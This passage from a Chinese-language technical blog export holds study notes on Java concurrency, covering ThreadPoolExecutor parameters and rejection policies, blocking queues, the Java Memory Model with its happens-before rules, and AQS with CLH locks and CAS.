<p>unit（时间单位）：这是keepAliveTime的时间单位，如秒、毫秒等。它定义了如何解释keepAliveTime的值。</p>
</li>
<li class="lvl-2">
<p>workQueue（工作队列）：这是一个用于存储等待执行的任务的队列。当线程池中的线程数达到corePoolSize，且这些线程都在执行任务时，新提交的任务会被放入workQueue中等待执行。</p>
</li>
<li class="lvl-2">
<p>threadFactory（线程工厂）：这是一个用于创建新线程的对象。通过自定义线程工厂，我们可以控制新线程的创建方式，例如设置线程的名字、是否是守护线程等。</p>
</li>
<li class="lvl-2">
<p>handler（拒绝策略）：当所有线程都在繁忙，且workQueue也已满时，新提交的任务会被拒绝。此时，就需要一个拒绝策略来处理这种情况。常见的拒绝策略有抛出异常、丢弃当前任务、丢弃队列中最旧的任务或者由调用线程直接执行该任务等。</p>
</li>
</ul>
<p><strong><code>ThreadPoolExecutor</code> 3 个最重要的参数：</strong></p>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong><code>corePoolSize</code> :</strong> 任务队列未达到队列容量时，最大可以同时运行的线程数量。</p>
</li>
<li class="lvl-2">
<p><strong><code>maximumPoolSize</code> :</strong> 任务队列中存放的任务达到队列容量的时候，当前可以同时运行的线程数量变为最大线程数。</p>
</li>
<li class="lvl-2">
<p><strong><code>workQueue</code>:</strong> 新任务来的时候会先判断当前运行的线程数量是否达到核心线程数，如果达到的话，新任务就会被存放在队列中。</p>
</li>
</ul>
<p><code>ThreadPoolExecutor</code>其他常见参数 :</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong><code>keepAliveTime</code></strong>:线程池中的线程数量大于 <code>corePoolSize</code> 的时候，如果这时没有新的任务提交，多余的空闲线程不会立即销毁，而是会等待，直到等待的时间超过了 <code>keepAliveTime</code>才会被回收销毁，线程池回收线程时，会对核心线程和非核心线程一视同仁，直到线程池中线程的数量等于 <code>corePoolSize</code> ，回收过程才会停止。</p>
</li>
<li class="lvl-2">
<p><strong><code>unit</code></strong> : <code>keepAliveTime</code> 参数的时间单位。</p>
</li>
<li class="lvl-2">
<p><strong><code>threadFactory</code></strong> :executor 创建新线程的时候会用到。</p>
</li>
<li class="lvl-2">
<p><strong><code>handler</code></strong> :饱和策略。关于饱和策略下面单独介绍一下。</p>
</li>
</ul>
<h2 id="2-3-拒绝策略">2.3 拒绝策略</h2>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202406132256696.png" alt="image.png"></p>
<p>如果当前同时运行的线程数量达到最大线程数量并且队列也已经被放满了任务时，<code>ThreadPoolExecutor</code> 定义一些策略:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>ThreadPoolExecutor.AbortPolicy</code>：抛出 RejectedExecutionException来<strong>拒绝新任务的处理</strong>。</p>
</li>
<li class="lvl-2">
<p><code>ThreadPoolExecutor.CallerRunsPolicy</code>：任务回退给调用者自己运行。调用执行自己的线程运行任务，也就是直接在调用<code>execute</code>方法的线程中运行(<code>run</code>)被拒绝的任务，如果执行程序已关闭，则会丢弃该任务。因此这种策略会降低对于新任务提交速度，影响程序的整体性能。如果你的应用程序可以承受此延迟并且你要求任何一个任务请求都要被执行的话，你可以选择这个策略。</p>
</li>
<li class="lvl-2">
<p><code>ThreadPoolExecutor.DiscardPolicy</code>：不处理新任务，直接丢弃掉。</p>
</li>
<li class="lvl-2">
<p><code>ThreadPoolExecutor.DiscardOldestPolicy</code>：此策略将丢弃最早的未处理的任务请求。</p>
</li>
</ul>
<h3 id="2-3-1-CallerRunsPolicy-拒绝策略有什么风险？如何解决？">2.3.1 CallerRunsPolicy 拒绝策略有什么风险？如何解决？</h3>
<blockquote>
<p>如果想要保证任何一个任务请求都要被执行的话，那选择 <code>CallerRunsPolicy</code> 拒绝策略更合适一些。</p>
</blockquote>
<p>如果走到<code>CallerRunsPolicy</code>的任务是个非常耗时的任务，且处理提交任务的线程是主线程，可能会导致<mark>主线程阻塞</mark>=，影响程序的正常运行。</p>
<h4 id="解决办法">解决办法</h4>
<ul class="lvl-0">
<li class="lvl-2">
<p>增加阻塞队列<code>BlockingQueue</code>的大小并调整堆内存以容纳更多的任务，确保任务能够被准确执行。</p>
</li>
<li class="lvl-2">
<p>为了充分利用 CPU，我们还可以调整线程池的<code>maximumPoolSize</code> （最大线程数）参数，这样可以提高任务处理速度，避免累计在 <code>BlockingQueue</code>的任务过多导致内存用完。</p>
</li>
<li class="lvl-2">
<p>任务持久化</p>
<ol>
<li class="lvl-7">设计一张任务表将任务存储到 MySQL 数据库中。</li>
<li class="lvl-7">Redis缓存任务</li>
<li class="lvl-7">将任务提交到消息队列<br>
<img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202406112203118.png" alt="image.png"></li>
</ol>
</li>
</ul>
<p><code>任务持久化</code>：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>拒绝策略</strong>： 实现<code>RejectedExecutionHandler</code>接口自定义拒绝策略，自定义拒绝策略负责将线程池暂时无法处理（此时阻塞队列已满）的任务入库（保存到 MySQL 中）。注意：线程池暂时无法处理的任务会先被放在阻塞队列中，阻塞队列满了才会触发拒绝策略。</p>
</li>
<li class="lvl-2">
<p><strong>任务队列</strong>：继承<code>BlockingQueue</code>实现一个混合式阻塞队列，该队列包含<code>JDK</code>自带的<code>ArrayBlockingQueue</code>。另外，该混合式阻塞队列需要修改取任务处理的逻辑，也就是重写<code>take()</code>方法，取任务时优先从数据库中读取最早的任务，数据库中无任务时再从 <code>ArrayBlockingQueue</code>中去取任务。</p>
</li>
</ul>
<h2 id="2-4-线程池阻塞队列">2.4 线程池阻塞队列</h2>
<p>新任务来的时候会先判断当前运行的线程数量是否达到核心线程数，如果达到的话，新任务就会被存放在队列中。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>容量为 <code>Integer.MAX_VALUE</code> 的 <code>LinkedBlockingQueue</code>（无界队列）：<code>FixedThreadPool</code> 和 <code>SingleThreadExector</code> 。<code>FixedThreadPool</code>最多只能创建核心线程数的线程（核心线程数和最大线程数相等），<code>SingleThreadExector</code>只能创建一个线程（核心线程数和最大线程数都是 1），二者的任务队列永远不会被放满。</p>
</li>
<li class="lvl-2">
<p><code>SynchronousQueue</code>（同步队列）：<code>CachedThreadPool</code> 。<code>SynchronousQueue</code> 没有容量，不存储元素，目的是保证对于提交的任务，如果有空闲线程，则使用空闲线程来处理；否则新建一个线程来处理任务。也就是说，<code>CachedThreadPool</code> 的最大线程数是 <code>Integer.MAX_VALUE</code> ，可以理解为线程数是可以无限扩展的，可能会创建大量线程，从而导致 OOM。</p>
</li>
<li class="lvl-2">
<p><code>DelayedWorkQueue</code>（延迟阻塞队列）：<code>ScheduledThreadPool</code> 和 <code>SingleThreadScheduledExecutor</code> 。<code>DelayedWorkQueue</code> 的内部元素并不是按照放入的时间排序，而是会按照延迟的时间长短对任务进行排序，内部采用的是“堆”的数据结构，可以保证每次出队的任务都是当前队列中执行时间最靠前的。<code>DelayedWorkQueue</code> 添加元素满了之后会自动扩容原来容量的 1/2，即永远不会阻塞，最大扩容可达 <code>Integer.MAX_VALUE</code>，所以最多只能创建核心线程数的线程。</p>
</li>
</ul>
<h2 id="2-5-处理任务流程">2.5 处理任务流程</h2>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202403051648891.png" alt="image.png"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>如果当前运行的线程数小于核心线程数，那么就会新建一个线程来执行任务。</p>
</li>
<li class="lvl-2">
<p>如果当前运行的线程数等于或大于核心线程数，但是小于最大线程数，那么就把该任务放入到任务队列里等待执行。</p>
</li>
<li class="lvl-2">
<p>如果向任务队列投放任务失败（任务队列已经满了），但是当前运行的线程数是小于最大线程数的，就新建一个线程来执行任务。</p>
</li>
<li class="lvl-2">
<p>如果当前运行的线程数已经等同于最大线程数了，新建线程将会使当前运行的线程超出最大线程数，那么当前任务会被拒绝，饱和策略会调用<code>RejectedExecutionHandler.rejectedExecution()</code>方法。</p>
</li>
</ul>
<h2 id="2-6-线程池中线程异常后，销毁还是复用？">2.6 线程池中线程异常后，销毁还是复用？</h2>
<p>先说结论，需要分两种情况：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>使用<code>execute()</code>提交任务</strong>：当任务通过<code>execute()</code>提交到线程池并在执行过程中抛出异常时，如果这个异常没有在任务内被捕获，那么该异常会导致当前线程终止，并且异常会被打印到控制台或日志文件中。线程池会检测到这种线程终止，并创建一个新线程来替换它，从而保持配置的线程数不变。</p>
</li>
<li class="lvl-2">
<p><strong>使用<code>submit()</code>提交任务</strong>：对于通过<code>submit()</code>提交的任务，如果在任务执行中发生异常，这个异常不会直接打印出来。相反，异常会被封装在由<code>submit()</code>返回的<code>Future</code>对象中。当调用<code>Future.get()</code>方法时，可以捕获到一个<code>ExecutionException</code>。在这种情况下，线程不会因为异常而终止，它会继续存在于线程池中，准备执行后续的任务。</p>
</li>
</ul>
<p>简单来说：使用<code>execute()</code>时，未捕获异常导致线程终止，线程池创建新线程替代；使用<code>submit()</code>时，异常被封装在<code>Future</code>中，线程继续复用。</p>
<p>这种设计允许<code>submit()</code>提供更灵活的错误处理机制，因为它允许调用者决定如何处理异常，而<code>execute()</code>则适用于那些不需要关注执行结果的场景。</p>
<h2 id="2-7-设计根据任务的优先级来执行的线程池">2.7 设计根据任务的优先级来执行的线程池</h2>
<p><code>PriorityBlockingQueue</code> 是一个支持优先级的无界阻塞队列，可以看作是线程安全的 <code>PriorityQueue</code>，两者底层都是使用小顶堆形式的二叉堆，即值最小的元素优先出队。不过，<code>PriorityQueue</code> 不支持阻塞操作。</p>
<p>要想让 <code>PriorityBlockingQueue</code> 实现对任务的排序，传入其中的任务必须是具备排序能力的，方式有两种：</p>
<ol>
<li class="lvl-3">
<p>提交到线程池的任务实现 <code>Comparable</code> 接口，并重写 <code>compareTo</code> 方法来指定任务之间的优先级比较规则。</p>
</li>
<li class="lvl-3">
<p>创建 <code>PriorityBlockingQueue</code> 时传入一个 <code>Comparator</code> 对象来指定任务之间的排序规则(推荐)。</p>
</li>
</ol>
<div class="tips">
<ul class="lvl-1">
<li class="lvl-2">
<p><code>PriorityBlockingQueue</code> 是无界的，可能堆积大量的请求，从而导致 OOM</p>
</li>
</ul>
</div>
<p>继承<code>PriorityBlockingQueue</code> 并重写一下 <code>offer</code> 方法(入队)的逻辑，当插入的元素数量超过指定值就返回 false 。</p>
<h2 id="2-8-Executor框架">2.8 Executor框架</h2>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202406121642277.png" alt="image.png"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>主线程首先要创建实现 <code>Runnable</code> 或者 <code>Callable</code> 接口的任务对象。</p>
</li>
<li class="lvl-2">
<p>把创建完成的实现 <code>Runnable</code>/<code>Callable</code>接口的 对象直接交给 <code>ExecutorService</code> 执行: <code>ExecutorService.execute（Runnable command）</code>）或者也可以把 <code>Runnable</code> 对象或<code>Callable</code> 对象提交给 <code>ExecutorService</code> 执行（<code>ExecutorService.submit（Runnable task）</code>或 <code>ExecutorService.submit（Callable &lt;T&gt; task）</code>）。</p>
</li>
<li class="lvl-2">
<p>如果执行 <code>ExecutorService.submit（…）</code>，<code>ExecutorService</code> 将返回一个实现<code>Future</code>接口的对象（我们刚刚也提到过了执行 <code>execute()</code>方法和 <code>submit()</code>方法的区别，<code>submit()</code>会返回一个 <code>FutureTask 对象）。由于 FutureTask</code> 实现了 <code>Runnable</code>，我们也可以创建 <code>FutureTask</code>，然后直接交给 <code>ExecutorService</code> 执行。</p>
</li>
<li class="lvl-2">
<p>最后，主线程可以执行 <code>FutureTask.get()</code>方法来等待任务执行完成。主线程也可以执行 <code>FutureTask.cancel（boolean mayInterruptIfRunning）</code>来取消此任务的执行。</p>
</li>
</ul>
<h2 id="2-9-关闭线程池">2.9 关闭线程池</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong><code>shutdown（）</code></strong> :关闭线程池，线程池的状态变为 <code>SHUTDOWN</code>。线程池不再接受新任务了，但是队列里的任务得执行完毕。</p>
</li>
<li class="lvl-2">
<p><strong><code>shutdownNow（）</code></strong> :关闭线程池，线程池的状态变为 <code>STOP</code>。线程池会终止当前正在运行的任务，停止处理排队的任务并返回正在等待执行的 List。</p>
</li>
</ul>
<h2 id="2-10-动态线程池">2.10 动态线程池</h2>
<p>提供三个方法修改线程池参数，通过配置中心进行变更推送：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>setCorePoolSize</p>
</li>
<li class="lvl-2">
<p>setMaximumPoolSize</p>
</li>
<li class="lvl-2">
<p>setKeepAliveTime</p>
</li>
</ul>
<p><a href="https://javaguide.cn/java/concurrent/java-thread-pool-summary.html">Java 线程池详解 | JavaGuide</a></p>
<h1>3 阻塞队列(生产者/消费者模型)</h1>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202403051635350.png" alt="image.png"></p>
<blockquote>
<p>poll和peek返回空来表示失败，因此，不能向队列中插入null</p>
</blockquote>
<table>
<thead>
<tr>
<th>队列</th>
<th></th>
<th>描述</th>
<th>使用的线程池</th>
</tr>
</thead>
<tbody>
<tr>
<td>LinkedBlockingQueue</td>
<td>无界队列</td>
<td>无上边界，链表实现</td>
<td><code>FixedThreadPool</code> 和 <code>SingleThreadExector</code></td>
</tr>
<tr>
<td>ArrayBlockingQueue(int capacity, boolean fair)</td>
<td></td>
<td>构建指定容量和公平性设置(可选)，循环数组实现</td>
<td></td>
</tr>
<tr>
<td>PriorityBlockingQueue</td>
<td>优先级阻塞队列</td>
<td>无界，阻塞优先队列</td>
<td></td>
</tr>
<tr>
<td>DelayQueue</td>
<td></td>
<td>无界，延迟超过指定时间的元素可以移出</td>
<td><code>ScheduledThreadPool</code> 和 <code>SingleThreadScheduledExecutor</code></td>
</tr>
<tr>
<td>SynchronousQueue</td>
<td>同步阻塞队列</td>
<td>没有容量，不存储元素</td>
<td><code>CachedThreadPool</code></td>
</tr>
</tbody>
</table>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202406132253307.png" alt="image.png"></p>
<h1>4 Future</h1>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202406121024843.png" alt="image.png"></p>
<h1>5 参考</h1>
<h2 id="5-1-ThreadLocal">5.1 ThreadLocal</h2>
<ol>
<li class="lvl-3">
<p><a href="https://pdai.tech/md/java/thread/java-thread-x-threadlocal.html">Java 并发 - ThreadLocal详解 | Java 全栈知识体系 (pdai.tech)</a></p>
</li>
<li class="lvl-3">
<p><a href="https://mp.weixin.qq.com/s/DZ978WVSd02TowYqHo1Snw">ThreadLocal详解 (qq.com)</a></p>
</li>
</ol>
<h2 id="5-2-线程池">5.2 线程池</h2>
<ol start="3">
<li class="lvl-3">
<p><a href="https://javaguide.cn/java/concurrent/java-thread-pool-summary.html">Java 线程池详解 | JavaGuide</a></p>
</li>
<li class="lvl-3">
<p><a href="https://javaguide.cn/java/concurrent/java-thread-pool-best-practices.html">Java 线程池最佳实践 | JavaGuide</a></p>
</li>
</ol>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>并发</tag>
      </tags>
  </entry>
  <entry>
    <title>Java并发(5)：JMM（Java内存模型）</title>
    <url>/2024/05/20/%E6%A1%86%E6%9E%B6/Java%E5%B9%B6%E5%8F%91/Java%E5%B9%B6%E5%8F%91(5)%EF%BC%9AJMM%EF%BC%88Java%E5%86%85%E5%AD%98%E6%A8%A1%E5%9E%8B%EF%BC%89/</url>
    <content><![CDATA[<blockquote>
<p>[!note]<br>
<strong>JMM(Java 内存模型)主要定义了对于一个共享变量，当另一个线程对这个共享变量执行写操作后，这个线程对这个共享变量的可见性。</strong><br>
JMM（Java Memory Model）是Java内存模型的缩写，是描述Java程序中多线程并发访问时，各个线程如何通过主存和工作内存进行通信的规范。</p>
</blockquote>
<h1>1 JMM（Java内存模型）</h1>
<blockquote>
<p>JMM 看作是 Java 定义的并发编程相关的一组规范，除了抽象了线程和主内存之间的关系之外，其还规定了从 Java 源代码到 CPU 可执行指令的这个转化过程要遵守哪些和并发相关的原则和规范，其主要目的是为了简化多线程编程，增强程序可移植性的。</p>
</blockquote>
<p><strong>为什么要遵守这些并发相关的原则和规范呢？</strong> 这是因为并发编程下，像 CPU 多级缓存和指令重排这类设计可能会导致程序运行出现一些问题。就比如说我们上面提到的指令重排序就可能会让多线程程序的执行出现问题，为此，JMM 抽象了 happens-before 原则（后文会详细介绍到）来解决这个指令重排序问题。</p>
<h2 id="1-1-CPU缓存模型">1.1 CPU缓存模型</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>主内存</strong>：所有线程创建的实例对象都存放在主内存中，不管该实例对象是成员变量，还是局部变量，类信息、常量、静态变量都是放在主内存中。为了获取更好的运行速度，虚拟机及硬件系统可能会让工作内存优先存储于寄存器和高速缓存中。</p>
</li>
<li class="lvl-2">
<p><strong>本地内存</strong>：每个线程都有一个私有的本地内存，本地内存存储了该线程以读 / 写共享变量的副本。每个线程只能操作自己本地内存中的变量，无法直接访问其他线程的本地内存。如果线程间需要通信，必须通过主内存来进行。本地内存是 JMM 抽象出来的一个概念，并不真实存在，它涵盖了缓存、写缓冲区、寄存器以及其他的硬件和编译器优化。<br>
<img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202405161021546.png" alt="image.png"></p>
</li>
</ul>
<h2 id="1-2-指令重排序">1.2 指令重排序</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>编译器优化重排</strong>：编译器（包括 JVM、JIT 编译器等）在不改变单线程程序语义的前提下，重新安排语句的执行顺序。</p>
</li>
<li class="lvl-2">
<p><strong>指令并行重排</strong>：现代处理器采用了指令级并行技术(Instruction-Level Parallelism，ILP)来将多条指令重叠执行。如果不存在数据依赖性，处理器可以改变语句对应机器指令的执行顺序。</p>
</li>
</ul>
<h2 id="1-3-Java内存区域和JMM">1.3 Java内存区域和JMM</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>JVM 内存结构和 Java 虚拟机的运行时区域相关</strong>，定义了 JVM 在运行时如何分区存储程序数据，就比如说堆主要用于存放对象实例。</p>
</li>
<li class="lvl-2">
<p><strong>Java 内存模型和 Java 的并发编程相关</strong>，抽象了线程和主内存之间的关系就比如说线程之间的共享变量必须存储在主内存中，规定了从 Java 源代码到 CPU 可执行指令的这个转化过程要遵守哪些和并发相关的原则和规范，其主要目的是为了简化多线程编程，增强程序可移植性的。多线程环境下对共享变量的访问</p>
</li>
</ul>
<h1>2 happens-before</h1>
<p><strong>为什么需要 happens-before 原则？</strong> happens-before 原则的诞生是为了程序员和编译器、处理器之间的平衡。程序员追求的是易于理解和编程的强内存模型，遵守既定规则编码即可。编译器和处理器追求的是较少约束的弱内存模型，让它们尽己所能地去优化性能，让性能最大化。happens-before 原则的设计思想其实非常简单：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>为了对编译器和处理器的约束尽可能少，只要不改变程序的执行结果（单线程程序和正确执行的多线程程序），编译器和处理器怎么进行重排序优化都行。</p>
</li>
<li class="lvl-2">
<p>对于会改变程序执行结果的重排序，JMM 要求编译器和处理器必须禁止这种重排序。<br>
<img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202405201015529.png" alt="image.png|350"></p>
</li>
</ul>
<h2 id="2-1-happens-before原则">2.1 happens-before原则</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>程序顺序规则</strong>：一个线程内，按照代码顺序，书写在前面的操作 happens-before 于书写在后面的操作；</p>
</li>
<li class="lvl-2">
<p><strong>解锁规则</strong>：解锁 happens-before 于加锁；</p>
</li>
<li class="lvl-2">
<p><strong>volatile 变量规则</strong>：对一个 volatile 变量的写操作 happens-before 于后面对这个 volatile 变量的读操作。说白了就是对 volatile 变量的写操作的结果对于发生于其后的任何操作都是可见的。</p>
</li>
<li class="lvl-2">
<p><strong>传递规则</strong>：如果 A happens-before B，且 B happens-before C，那么 A happens-before C；</p>
</li>
<li class="lvl-2">
<p><strong>线程启动规则</strong>：Thread 对象的 <code>start()</code>方法 happens-before 于此线程的每一个动作。</p>
</li>
<li class="lvl-2">
<p><strong>join()规则</strong>：如果线程A执行操作ThreadB.join()并成功返回，那么线程B中的任意操作happens-before于线程A从ThreadB.join()操作成功返回。</p>
</li>
</ul>
<h1>3 并发编程</h1>
<h2 id="3-1-原子性">3.1 原子性</h2>
<p>一次操作或者多次操作，要么所有的操作全部都得到执行并且不会受到任何因素的干扰而中断，要么都不执行。</p>
<p>在 Java 中，可以借助<code>synchronized</code>、各种 <code>Lock</code> 以及各种原子类实现原子性。</p>
<p><code>synchronized</code> 和各种 <code>Lock</code> 可以保证任一时刻只有一个线程访问该代码块，因此可以保障原子性。各种原子类是利用 CAS (compare and swap) 操作（可能也会用到 <code>volatile</code>或者<code>final</code>关键字）来保证原子操作。</p>
<h2 id="3-2-可见性">3.2 可见性</h2>
<p>当一个线程对共享变量进行了修改，那么另外的线程都是立即可以看到修改后的最新值。</p>
<p>在 Java 中，可以借助<code>synchronized</code>、<code>volatile</code> 以及各种 <code>Lock</code> 实现可见性。</p>
<p>如果我们将变量声明为 <code>volatile</code> ，这就指示 JVM，这个变量是共享且不稳定的，每次使用它都到主存中进行读取。</p>
<h2 id="3-3-有序性">3.3 有序性</h2>
<p>由于指令重排序问题，代码的执行顺序未必就是编写代码时候的顺序。</p>
<p>我们上面讲重排序的时候也提到过：</p>
<blockquote>
<p><strong>指令重排序可以保证串行语义一致，但是没有义务保证多线程间的语义也一致</strong> ，所以在多线程下，指令重排序可能会导致一些问题。</p>
</blockquote>
<p>在 Java 中，<code>volatile</code> 关键字可以禁止指令进行重排序优化。</p>
<h1>4 参考</h1>
<p><a href="https://zhuanlan.zhihu.com/p/126275344">happens-before是什么？JMM最最核心的概念，看完你就懂了 - 知乎 (zhihu.com)</a><br>
<a href="https://javaguide.cn/java/concurrent/jmm.html">JMM（Java 内存模型）详解 | JavaGuide</a></p>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>并发</tag>
      </tags>
  </entry>
  <entry>
    <title>Java并发(3)：AQS</title>
    <url>/2024/05/15/%E6%A1%86%E6%9E%B6/Java%E5%B9%B6%E5%8F%91/Java%E5%B9%B6%E5%8F%91(3)%EF%BC%9AAQS/</url>
    <content><![CDATA[<p>AQS 的全称为 <code>AbstractQueuedSynchronizer</code> ，抽象队列同步器。</p>
<p>AQS 就是一个抽象类，主要用来构建锁和同步器。</p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line">public <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractQueuedSynchronizer</span> <span class="keyword">extends</span> <span class="title">AbstractOwnableSynchronizer</span> <span class="title">implements</span> <span class="title">java</span>.<span class="title">io</span>.<span class="title">Serializable</span> </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>AQS 为构建锁和同步器提供了一些通用功能的实现</strong>，因此，使用 AQS 能简单且高效地构造出应用广泛的大量的同步器，比如我们提到的 <code>ReentrantLock</code>，<code>Semaphore</code>，其他的诸如 <code>ReentrantReadWriteLock</code>，<code>SynchronousQueue</code>等等皆是基于 AQS 的。</p>
<p>AbstractQueuedSynchronizer是个抽象类，所有用到方法的类都要继承此类的若干方法，对应的设计模式就是模版模式。模版模式定义：一个抽象类公开定义了执行它的方法的方式/模板。它的子类可以按需要重写方法实现，但调用将以抽象类中定义的方式进行。这种类型的设计模式属于行为型模式。</p>
<p>为实现阻塞锁和相关的同步器提供一个框架，是一个抽象类的队列式同步器</p>
<h1>1 CLH</h1>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202406101010308.png" alt="image.png"></p>
<p>CLH队列，全称Craig-Landin-Hagersten队列，是一种基于链表结构的自旋锁等待队列。它由一系列节点组成，每个节点代表一个等待锁的线程。这些节点按照FIFO（先进先出）的原则组织在一起，形成一个双向队列。</p>
<p>在CLH队列中，每个节点都包含一个指向前驱节点的引用和一个指向后继节点的引用。此外，每个节点还维护一个表示锁状态的标志位。当一个线程需要获取锁时，它会检查前驱节点的锁状态。如果前驱节点持有锁，当前线程就会进入自旋等待状态，不断检查前驱节点的锁状态，直到前驱节点释放锁为止。一旦前驱节点释放锁，当前线程就可以获取锁并执行相应的操作。</p>
<p><strong>自旋锁</strong>没有抢到锁的线程会一直自旋等待锁的释放，处于<strong>busy-waiting</strong>的状态，此时等待锁的线程不会进入休眠状态，而是一直忙等待浪费CPU周期。<strong>因此自旋锁适用于锁占用时间短的场合。</strong></p>
<p><strong>互斥锁</strong>说的是传统意义的互斥锁，就是多个线程并发竞争锁的时候，没有抢到锁的线程会进入休眠状态即<strong>sleep-waiting</strong>，当锁被释放的时候，处于休眠状态的一个线程会再次获取到锁。缺点就是这一些列过程需要线程切换，需要执行很多CPU指令，同样需要时间。如果CPU执行线程切换的时间比锁占用的时间还长，那么可能还不如使用自旋锁。<strong>因此互斥锁适用于锁占用时间长的场合。</strong></p>
<p><strong>CLH锁</strong>其实就是一种是基于逻辑队列非线程饥饿的一种自旋公平锁，由于是 Craig、Landin 和 Hagersten三位发明，因此命名为CLH锁。</p>
<p><strong>CLH锁原理如下：</strong></p>
<ol>
<li class="lvl-3">
<p>首先有一个尾节点指针，通过这个尾结点指针来构建等待线程的逻辑队列，因此能确保线程线程先到先服务的公平性，因此尾指针可以说是构建逻辑队列的桥梁；此外这个尾节点指针是原子引用类型，避免了多线程并发操作的线程安全性问题；</p>
</li>
<li class="lvl-3">
<p>通过等待锁的每个线程在自己的某个变量上自旋等待，这个变量将由前一个线程写入。由于某个线程获取锁操作时总是通过尾节点指针获取到前一线程写入的变量，而尾节点指针又是原子引用类型，因此确保了这个变量获取出来总是线程安全的。</p>
</li>
</ol>
<p><a href="https://gaoyeming.github.io/2020/05/27/CLH.html">CLH原理解析 - 我爱2B哥の博客 (gaoyeming.github.io)</a><br>
<a href="https://zhuanlan.zhihu.com/p/210274794">AQS基础——多图详解CLH锁的原理与实现 - 知乎 (zhihu.com)</a><br>
<a href="https://blog.csdn.net/u012808915/article/details/135965756">深入解析CLH队列：原理、应用与优势-CSDN博客</a><a href="https://blog.csdn.net/claram/article/details/83828768">算法：CLH锁的原理及实现_clh算法-CSDN博客</a></p>
<h1>2 Java中的CAS</h1>
<p>compare and swap的缩写，中文翻译成比较并交换,实现并发算法时常用到的一种技术。它包含三个操作数——内存位置、预期原值及更新值。执行CAS操作的时候，将内存位置的值与预期原值比较：如果相匹配，那么处理器会自动将该位置值更新为新值，如果不匹配，处理器不做任何操作，多个线程同时执行CAS操作只有一个会成功。</p>
<p>CAS （CompareAndSwap） 有3个操作数，位置内存值V，旧的预期值A，要修改的更新值B。当且仅当旧的预期值A和内存值V相同时，将内存值V修改为B，否则什么都不做或重来。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>基本类型原子类 -AtomicLong、AtomicInteger、AtomicBoolean</p>
</li>
<li class="lvl-2">
<p>数组类型原子类- AtomicIntegerArray、AtomicLongArray、AtomicReferenceArray</p>
</li>
<li class="lvl-2">
<p>引用类型原子类- AtomicReference、AtomicStampedReference、AtomicMarkableReference</p>
</li>
</ul>
<p><a href="https://andyoung.blog.csdn.net/article/details/128951241">源码级别的讲解JAVA 中的CAS_cas源码-CSDN博客</a></p>
<h1>3 AQS原理</h1>
<p>CountDownLatch、Semaphore、ReentrantLock、ReentrantReadWriteLock</p>
<p><strong>AQS 核心思想是，如果被请求的共享资源空闲，则将当前请求资源的线程设置为有效的工作线程，并且将共享资源设置为锁定状态。如果被请求的共享资源被占用，那么就需要一套线程阻塞等待以及被唤醒时锁分配的机制</strong>，这个机制 AQS 是用 <strong>CLH 队列锁</strong> 实现的，即将暂时获取不到锁的线程加入到等待队列中。</p>
<p>CLH(Craig,Landin,and Hagersten) 队列是一个虚拟的双向队列（虚拟的双向队列即不存在队列实例，仅存在结点之间的关联关系）。AQS 是将每条请求共享资源的线程封装成一个 CLH 锁队列的一个结点（Node）来实现锁的分配。在 CLH 同步队列中，一个节点表示一个线程，它保存着线程的引用（thread）、 当前节点在队列中的状态（waitStatus）、前驱节点（prev）、后继节点（next）。</p>
<p>AQS 使用 <strong>int 成员变量 <code>state</code> 表示同步状态</strong>，通过内置的 <strong>FIFO 线程等待/等待队列</strong> 来完成获取资源线程的排队工作。</p>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202406121504166.png" alt="image.png"></p>
<p><code>state</code> 变量由 <code>volatile</code> 修饰，用于展示当前临界资源的获锁情况。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 共享变量，使用volatile修饰保证线程可见性</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">volatile</span> <span class="type">int</span> state;</span><br></pre></td></tr></table></figure>
<p><strong>状态</strong></p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>getState()</code>：返回同步状态</p>
</li>
<li class="lvl-2">
<p><code>setState(int newState)</code>：设置同步状态</p>
</li>
<li class="lvl-2">
<p><code>compareAndSetState(int expect, int update)</code>：使用<code>CAS</code>设置同步状态</p>
</li>
<li class="lvl-2">
<p><code>isHeldExclusively()</code>：当前线程是否持有资源</p>
</li>
</ul>
<p><strong>独占资源（不响应线程中断）</strong></p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>tryAcquire(int arg)</code>：独占式获取资源，子类实现</p>
</li>
<li class="lvl-2">
<p><code>acquire(int arg)</code>：独占式获取资源模板</p>
</li>
<li class="lvl-2">
<p><code>tryRelease(int arg)</code>：独占式释放资源，子类实现</p>
</li>
<li class="lvl-2">
